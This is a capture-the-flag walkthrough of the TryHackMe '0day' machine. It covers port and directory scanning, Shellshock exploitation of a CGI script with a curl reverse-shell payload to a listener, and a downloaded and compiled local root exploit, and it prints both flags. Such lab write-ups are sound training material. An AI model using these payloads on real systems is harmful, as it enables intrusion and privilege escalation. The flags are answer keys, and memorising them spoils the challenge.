# 0day TryHackMe Machine CTF

Step by step and errors I ran into:

## Step 1: Reconnaissance
```bash
nmap -p- -sC -sV -T4 10.48.186.164
```
Found ports 22 (SSH) and 80 (HTTP)

## Step 2: Directory Enumeration
```bash
gobuster dir -u http://10.48.186.164 -w /usr/share/wordlists/dirb/common.txt -x .cgi,.sh,.pl
```
Discovered `/cgi-bin/test.cgi`

## Step 3: Test Shellshock Vulnerability
```bash
curl -H "User-Agent: () { :; }; echo; echo; /bin/bash -c 'id'" http://10.48.186.164/cgi-bin/test.cgi
```
Output showed `uid=33(www-data)` - vulnerable!

## Step 4: Get Reverse Shell

**Terminal 1 (Listener):**
```bash
nc -lvnp 4444
```

**Terminal 2 (Payload):**
```bash
curl -H "User-Agent: () { :; }; /bin/bash -c 'bash -i >& /dev/tcp/10.48.90.114/4444 0>&1'" http://10.48.186.164/cgi-bin/test.cgi
```

*Error I Ran Into:* Reverse shell died after `Ctrl+C` - had to re-trigger Shellshock.

## Step 5: Get User Flag
```bash
cd /home/ryan
cat user.txt
```
**Flag:** `THM{Sh3llSh0ck_r0ckz}`

## Step 6: Privilege Escalation to Root

On Kali - download exploit:
```bash
searchsploit -m linux/local/37292
```

On Kali - start Python server:
```bash
python3 -m http.server 8000
```

On victim reverse shell - download exploit:
```bash
cd /tmp
wget http://10.48.90.114:8000/37292.c
```

*Error I Ran Into:* `404 Not Found` - Python server wasn't in correct directory. Fixed by running server from `/tmp`.

Set PATH (critical step):
```bash
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```

Compile exploit on victim:
```bash
/usr/bin/gcc 37292.c -o exploit
chmod +x exploit
./exploit
```

**Errors I Ran Into During Privilege Escalation:**
- `gcc: command not found` - Compiler missing from PATH. Solution: Set PATH manually.
- `mount: only root can do that` - Permission error but exploit still worked.
- `gcc: error trying to exec 'cc1'` - Warnings appeared but exploit still gave root shell.
- Python exploit syntax errors - Switched to C exploit (`37292.c`).
- Pre-compiled binaries 404 - Used source code and compiled locally.

## Step 7: Get Root Flag

After exploit ran, prompt changed to `#` (root shell):
```bash
cat /root/root.txt
```
**Flag:** `THM{g00d_j0b_0day_is_Pleased}`

## Tools Used:
- Nmap 
- Gobuster
- Curl
- Netcat
- Python3
- Searchsploit 
- GCC
- Python HTTP Server

## Final Flags:
- User: `THM{Sh3llSh0ck_r0ckz}`
- Root: `THM{g00d_j0b_0day_is_Pleased}`
